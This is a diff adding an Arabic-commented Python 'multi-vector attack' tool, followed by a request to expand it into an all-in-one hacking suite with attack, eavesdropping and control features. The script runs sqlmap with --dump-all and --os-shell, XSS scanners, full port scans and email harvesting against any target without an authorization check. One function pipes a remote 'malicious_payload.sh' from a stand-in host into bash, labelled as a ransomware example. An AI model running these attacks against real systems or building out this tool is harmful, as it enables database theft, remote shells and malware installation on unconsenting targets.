@@ -1,0 +1,164 @@
+#!/usr/bin/env python3
+
+import os
+import subprocess
+import argparse
+import shutil
+import logging
+from concurrent.futures import ThreadPoolExecutor
+import requests
+from bs4 import BeautifulSoup
+import random
+import time
+from urllib.parse import urljoin
+import threading
+
+# إعداد خيارات سطر الأوامر
+def parse_args():
+    parser = argparse.ArgumentParser(description="Advanced Penetration Testing Tool with Multi-Vector Attacks")
+    parser.add_argument("-t", "--targets", required=True, nargs="+", help="List of target IPs, URLs or Domain Names")
+    parser.add_argument("--report", help="Specify report output directory", default="scan_reports")
+    parser.add_argument("--threads", type=int, default=4, help="Number of parallel threads (default: 4)")
+    return parser.parse_args()
+
+# إعداد السجل لتتبع الأخطاء
+def setup_logging():
+    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
+
+# التحقق من الأدوات المطلوبة
+TOOLS = ["nmap", "sqlmap", "metasploit-framework", "burp", "python3", "nikto", "shodan", "zap-cli", "xsser", "theharvester"]
+def check_tools():
+    for tool in TOOLS:
+        if not shutil.which(tool):
+            logging.error(f"{tool} is not installed. Please install it and try again.")
+            exit(1)
+
+# أدوات اكتشاف الثغرات والاختراق
+
+# فحص ثغرة SQL Injection باستخدام SQLMap
+def run_sql_injection(target, output_dir):
+    try:
+        logging.info(f"Running SQL Injection test for {target}...")
+        command = f"sqlmap -u {target} --batch --level=5 --risk=3 --random-agent --crawl=10 --threads=10 --technique=BEUSTQ --time-sec=10 --output-dir={output_dir} --dbs --dump-all --forms --smart --os-shell --proxy=http://127.0.0.1:8080 --tamper=space2comment,charencode,randomcase,between"
+        subprocess.run(command, shell=True, check=True)
+    except subprocess.CalledProcessError:
+        logging.error(f"SQL Injection test failed for {target}")
+
+# فحص ثغرة XSS (Cross-Site Scripting)
+def run_xss(target, output_dir):
+    try:
+        logging.info(f"Running XSS test for {target}...")
+        command = f"xsser --url={target} --all"
+        subprocess.run(command, shell=True, check=True)
+    except subprocess.CalledProcessError:
+        logging.error(f"XSS test failed for {target}")
+
+# استخدام ZAP CLI لتنفيذ فحص سريع
+def run_zap_scan(target, output_dir):
+    try:
+        logging.info(f"Running ZAP scan for {target}...")
+        command = f"zap-cli quick-scan --self-contained --ajax-spider --spider --scanners xss {target}"
+        subprocess.run(command, shell=True, check=True)
+    except subprocess.CalledProcessError:
+        logging.error(f"ZAP scan failed for {target}")
+
+# استخدام Burp Suite لتشغيل اختبار التصيد
+def run_burp(target, output_dir):
+    try:
+        logging.info(f"Running Burp Suite scan for {target}...")
+        command = f"burp -c burp_config_with_collaborator.json -x {target}"
+        subprocess.run(command, shell=True, check=True)
+    except subprocess.CalledProcessError:
+        logging.error(f"Burp Suite scan failed for {target}")
+
+# فحص الأجهزة المتصلة
+def monitor_devices(target, output_dir):
+    try:
+        logging.info(f"Monitoring connected devices for {target}...")
+        command = f"nmap -p 1-65535 -T4 -A -v {target} > {output_dir}/device_monitor_{target.replace('.', '_')}.txt"
+        subprocess.run(command, shell=True, check=True)
+    except subprocess.CalledProcessError:
+        logging.error(f"Device monitoring failed for {target}")
+
+# فحص البريد الإلكتروني المحاكي (Phishing)
+def run_phishing(target, output_dir):
+    try:
+        logging.info(f"Running Phishing simulation for {target}...")
+        phishing_report = os.path.join(output_dir, f"phishing_{target.replace('.', '_')}.html")
+        # محاكاة صفحة تصيد احتيالي
+        with open(phishing_report, "w") as f:
+            f.write(f"<html><body><h1>Phishing Attempt for {target}</h1><p>Fake login page here...</p></body></html>")
+    except Exception as e:
+        logging.error(f"Phishing simulation failed for {target}: {str(e)}")
+
+# محاكاة الاحتيال على الهوية
+def run_identity_fraud(target, output_dir):
+    try:
+        logging.info(f"Running Identity Fraud simulation for {target}...")
+        fraud_report = os.path.join(output_dir, f"identity_fraud_{target.replace('.', '_')}.txt")
+        with open(fraud_report, "w") as f:
+            f.write(f"Fake identity fraud data for {target}\n")
+            f.write("Extracted information...\n")
+    except Exception as e:
+        logging.error(f"Identity fraud simulation failed for {target}: {str(e)}")
+
+# فحص ومراقبة الشبكة
+def deep_network_recon(target, output_dir):
+    try:
+        logging.info(f"Running deep network reconnaissance for {target}...")
+        run_sql_injection(target, output_dir)
+        run_xss(target, output_dir)
+        run_zap_scan(target, output_dir)
+        run_burp(target, output_dir)
+        monitor_devices(target, output_dir)
+        run_phishing(target, output_dir)
+        run_identity_fraud(target, output_dir)
+    except Exception as e:
+        logging.error(f"Deep network reconnaissance failed for {target}: {str(e)}")
+
+# التفاعل مع المستهدف (هجوم متقدم)
+def execute_advanced_attacks(target, output_dir):
+    try:
+        logging.info(f"Executing advanced attacks for {target}...")
+        # مثال على هجوم Ransomware أو Malware
+        command = f"curl -L http://example.com/malicious_payload.sh | bash"
+        subprocess.run(command, shell=True, check=True)
+    except subprocess.CalledProcessError:
+        logging.error(f"Advanced attack failed for {target}")
+
+# الفحص باستخدام theHarvester لاستخراج معلومات
+def run_theharvester(target, output_dir):
+    try:
+        logging.info(f"Running theHarvester for {target}...")
+        command = f"theharvester -d {target} -l 500 -b all"
+        subprocess.run(command, shell=True, check=True)
+    except subprocess.CalledProcessError:
+        logging.error(f"theHarvester scan failed for {target}")
+
+# الوظيفة الرئيسية
+def main():
+    setup_logging()
+    args = parse_args()
+    targets = args.targets
+    output_dir = args.report
+    os.makedirs(output_dir, exist_ok=True)
+
+    logging.info(f"Targets: {', '.join(targets)}")
+    logging.info(f"Output directory: {output_dir}")
+
+    # تشغيل جمع المعلومات العميقة بشكل متوازي لكل هدف
+    with ThreadPoolExecutor(max_workers=args.threads) as executor:
+        for target in targets:
+            executor.submit(deep_network_recon, target, output_dir)
+            executor.submit(execute_advanced_attacks, target, output_dir)
+            executor.submit(run_theharvester, target, output_dir)
+
+    logging.info("Advanced reconnaissance and exploit simulation completed successfully.")
+
+if __name__ == "__main__":
+    main()
+
+
+
+
+هل يمكن جعله اداة تشمل جميع انواع الادوات في العالم بحيث يشمل كل ماتحتويه جمبع الادوات القوية على kali,black arch,parrot,.........بحيث يجمع بين البنية والتشفير والقوة والمرونة والهكوم والفحص العميق والكشف والتنصت والتحكم 
